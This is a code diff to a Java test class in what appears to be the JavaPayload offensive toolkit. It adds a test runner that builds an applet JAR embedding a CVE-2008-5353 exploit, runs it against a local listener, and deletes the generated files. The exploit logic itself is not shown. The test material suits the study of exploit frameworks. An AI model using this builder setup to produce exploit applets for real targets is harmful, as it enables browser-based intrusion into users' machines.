@@ -35,9 +35,11 @@ package javapayload.test;
 
 import java.io.File;
 import java.io.IOException;
+import java.net.ServerSocket;
 
 import javapayload.builder.CVE_2008_5353_AppletJarBuilder;
 import javapayload.builder.CVE_2010_0840_AppletJarBuilder;
+import javapayload.builder.EmbeddedAppletJarBuilder;
 
 public class BuilderTest14 extends BuilderTest {
 	public static class CVE_2008_5353TestRunner extends WaitingBuilderTestRunner {
@@ -60,6 +62,35 @@ public class BuilderTest14 extends BuilderTest {
 		}
 	}
 	
+	public static class EmbeddedCVE_2008_5353TestRunner extends WaitingBuilderTestRunner {
+		public String getName() { return "CVE_2008_5353 [kill]"; }
+		
+		private ServerSocket ss;
+
+		public void runBuilder(String[] args) throws Exception {
+			ss = new ServerSocket(0);
+			String[] builderArgs = new String[args.length+5];
+			builderArgs[0] = "--builder";
+			builderArgs[1] = "CVE_2008_5353_AppletJar";
+			builderArgs[2] = "--readyURL";
+			builderArgs[3] = "http://localhost:" + ss.getLocalPort() + "/foo";
+			builderArgs[4] = "cve.jar";
+			System.arraycopy(args, 0, builderArgs, 5, args.length);
+			new EmbeddedAppletJarBuilder().build(builderArgs);
+		}
+
+		public void runResult(String[] args) throws Exception {
+			runAppletAndWait(this, "cve.jar", "javapayload.exploit.CVE_2008_5353", null, null, ss);
+		}
+
+		public void cleanup() throws Exception {
+			if (!new File("applettest.html").delete())
+				throw new IOException("Unable to delete file");
+			if (!new File("cve.jar").delete())
+				throw new IOException("Unable to delete file");
+		}
+	}
+
 	public static class CVE_2010_0840TestRunner extends CVE_2008_5353TestRunner implements BuilderTestRunner {
 		protected String getCVEName() { return "2010_0840"; }
 
